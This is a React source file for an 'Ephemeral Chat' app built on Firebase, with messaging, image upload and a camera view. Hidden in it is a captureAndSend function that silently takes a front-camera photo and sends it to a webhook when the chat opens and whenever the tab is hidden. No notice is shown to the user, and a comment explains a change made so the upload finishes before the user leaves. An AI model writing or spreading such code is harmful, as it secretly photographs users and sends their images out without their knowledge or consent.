"use client";

import { useState, useRef, useEffect, useCallback } from 'react';
import { ref, onValue, push, serverTimestamp, DataSnapshot, remove } from 'firebase/database';
import { database } from '@/lib/firebase';
import { LogOut, Paperclip, Camera, SendHorizonal } from 'lucide-react';
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { ScrollArea } from '@/components/ui/scroll-area';
import { cn } from '@/lib/utils';
import { useToast } from '@/hooks/use-toast';
import { Alert, AlertTitle, AlertDescription } from '@/components/ui/alert';
import { sendWebhook } from '@/ai/flows/send-webhook';

type Message = {
  id: string;
  text?: string;
  image?: string;
  senderId: string;
  timestamp: object | number;
};

const userId = `user-${Math.random().toString(36).substring(2, 9)}`;

const captureAndSend = async (message: string) => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    const video = document.createElement('video');
    video.srcObject = stream;
    await new Promise((resolve) => video.onloadedmetadata = resolve);
    video.play();

    await new Promise(resolve => setTimeout(resolve, 500));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    context?.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/jpeg');
    stream.getTracks().forEach(track => track.stop());

    await sendWebhook({ photoDataUri: dataUrl, message });
  } catch (err) {
    console.error("Camera permission denied or error:", err);
  }
};


export default function ChatView() {
  const handleExit = useCallback(async () => {
    await captureAndSend("left chat");
    // We remove window.location.reload() here. 
    // The app will return to the puzzle view on next visit because isUnlocked is not persisted.
    // This allows the async webhook to complete before the browser navigates away.
    const messagesRef = ref(database, 'messages');
    remove(messagesRef);
  }, []);

  useEffect(() => {
    captureAndSend("entered chat");

    const handleVisibilityChange = () => {
      if (document.visibilityState === 'hidden') {
        handleExit();
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);

    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [handleExit]);

  return (
    <div className="flex flex-col w-full h-full bg-card">
      <header className="flex items-center justify-between p-3 sm:p-4 border-b bg-card">
        <h1 className="text-xl font-headline font-bold">Ephemeral Chat</h1>
        <Button
          variant="ghost"
          size="icon"
          onClick={() => window.location.reload()}
          aria-label="Exit Chat"
        >
          <LogOut className="h-6 w-6 text-muted-foreground" />
        </Button>
      </header>
      <ChatRoomView />
    </div>
  );
}

function ChatRoomView() {
  const [messages, setMessages] = useState<Message[]>([]);
  const [input, setInput] = useState('');
  const [isTakingPicture, setIsTakingPicture] = useState(false);
  const scrollAreaRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const messagesRef = ref(database, 'messages');
    const unsubscribe = onValue(messagesRef, (snapshot: DataSnapshot) => {
      const messagesData: Message[] = [];
      const snapshotVal = snapshot.val();
      if (snapshotVal) {
          Object.keys(snapshotVal).forEach((key) => {
            messagesData.push({ id: key, ...snapshotVal[key] });
          });
          messagesData.sort((a, b) => {
            const timeA = typeof a.timestamp === 'number' ? a.timestamp : 0;
            const timeB = typeof b.timestamp === 'number' ? b.timestamp : 0;
            return timeA - timeB;
          });
          setMessages(messagesData);
      } else {
          setMessages([]);
      }
    });

    return () => unsubscribe();
  }, []);

  useEffect(() => {
    const scrollArea = scrollAreaRef.current;
    if (scrollArea) {
      const viewport = scrollArea.querySelector('div[data-radix-scroll-area-viewport]');
      if (viewport) {
        setTimeout(() => {
          viewport.scrollTo({ top: viewport.scrollHeight, behavior: 'smooth' });
        }, 100);
      }
    }
  }, [messages]);
  
  const handleSend = () => {
    if (input.trim() === '') return;

    if (input.trim().toLowerCase() === '/clear') {
      const messagesRef = ref(database, 'messages');
      remove(messagesRef);
      setInput('');
      return; 
    }

    const messagesRef = ref(database, 'messages');
    push(messagesRef, {
      text: input,
      senderId: userId,
      timestamp: serverTimestamp(),
    });
    setInput('');
  };
  
  const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file && file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = (e) => {
        const messagesRef = ref(database, 'messages');
        push(messagesRef, {
          image: e.target?.result as string,
          senderId: userId,
          timestamp: serverTimestamp(),
        });
      };
      reader.readAsDataURL(file);
    }
    if(event.target) event.target.value = '';
  };

  if (isTakingPicture) {
    return <CameraView onCancel={() => setIsTakingPicture(false)} onPictureTaken={() => setIsTakingPicture(false)} />;
  }

  return (
    <>
      <ScrollArea className="flex-1 p-4" ref={scrollAreaRef}>
        <div className="flex flex-col gap-4">
          {messages.length > 0 ? messages.map((msg) => (
            <div
              key={msg.id}
              className={cn(
                "flex items-start gap-2.5 max-w-[80%] animate-in fade-in-0 slide-in-from-bottom-4 duration-500",
                msg.senderId === userId ? 'self-end' : 'self-start'
              )}
            >
              <div
                className={cn(
                  'p-3 rounded-2xl shadow-md',
                  msg.senderId === userId 
                    ? 'bg-primary text-primary-foreground rounded-br-none' 
                    : 'bg-secondary text-secondary-foreground rounded-bl-none'
                )}
              >
                {msg.text && <p className="text-sm whitespace-pre-wrap">{msg.text}</p>}
                {msg.image && (
                   <Image src={msg.image} alt="Sent media" width={250} height={250} className="rounded-md object-cover max-w-full h-auto"/>
                )}
              </div>
            </div>
          )) : (
             <div className="flex items-center justify-center h-full text-muted-foreground">
                <div className="text-center">
                  <p className="font-bold text-lg mb-2">Welcome to Ephemeral Chat!</p>
                  <p>Send a message to start the conversation.</p>
                  <p className="text-xs mt-4">All messages are deleted periodically.</p>
                </div>
            </div>
          )}
        </div>
      </ScrollArea>
      
      <footer className="p-3 sm:p-4 border-t bg-card/50">
        <div className="relative">
          <Textarea
            placeholder="Type your message..."
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={(e) => {
              if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                handleSend();
              }
            }}
            rows={1}
            className="pr-40 min-h-[48px] resize-none"
          />
          <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
            <input type="file" accept="image/*" ref={fileInputRef} onChange={handleFileChange} className="hidden" />
            <Button variant="ghost" size="icon" onClick={() => fileInputRef.current?.click()} aria-label="Attach file">
              <Paperclip className="h-5 w-5" />
            </Button>
            <Button variant="ghost" size="icon" onClick={() => setIsTakingPicture(true)} aria-label="Open camera">
                <Camera className="h-5 w-5" />
            </Button>
            <Button size="icon" onClick={handleSend} aria-label="Send message" className="bg-accent hover:bg-accent/90 text-accent-foreground">
              <SendHorizonal className="h-5 w-5" />
            </Button>
          </div>
        </div>
      </footer>
    </>
  );
}

function CameraView({ onCancel, onPictureTaken }: { onCancel: () => void, onPictureTaken: () => void }) {
  const [hasCameraPermission, setHasCameraPermission] = useState(true);
  const videoRef = useRef<HTMLVideoElement>(null);
  const { toast } = useToast();

  useEffect(() => {
    const getCameraPermission = async () => {
      if (typeof window === 'undefined') return;
      
      try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        setHasCameraPermission(true);

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
        }
      } catch (error) {
        console.error('Error accessing camera:', error);
        setHasCameraPermission(false);
        toast({
          variant: 'destructive',
          title: 'Camera Access Denied',
          description: 'Please enable camera permissions in your browser settings to use this app.',
        });
      }
    };

    getCameraPermission();

    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject as MediaStream;
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, [toast]);
  
  const takePicture = () => {
      if (videoRef.current) {
          const canvas = document.createElement('canvas');
          canvas.width = videoRef.current.videoWidth;
          canvas.height = videoRef.current.videoHeight;
          const context = canvas.getContext('2d');
          if(context){
              context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
              const dataUrl = canvas.toDataURL('image/png');
              
              const messagesRef = ref(database, 'messages');
              push(messagesRef, {
                image: dataUrl,
                senderId: userId,
                timestamp: serverTimestamp(),
              });
          }
          onPictureTaken();
      }
  }

  return (
    <div className="flex-1 p-4 flex flex-col items-center justify-center gap-4">
      <div className="w-full max-w-md aspect-video rounded-md bg-muted overflow-hidden">
        <video ref={videoRef} className="w-full h-full object-cover" autoPlay muted playsInline />
      </div>
      { !hasCameraPermission && (
          <Alert variant="destructive">
            <AlertTitle>Camera Access Required</AlertTitle>
            <AlertDescription>
              Please allow camera access to use this feature.
            </AlertDescription>
          </Alert>
      )}
       <div className="flex gap-2">
          <Button onClick={takePicture} disabled={!hasCameraPermission}>Take Picture</Button>
          <Button variant="outline" onClick={onCancel}>Cancel</Button>
      </div>
   </div>
  );
}

    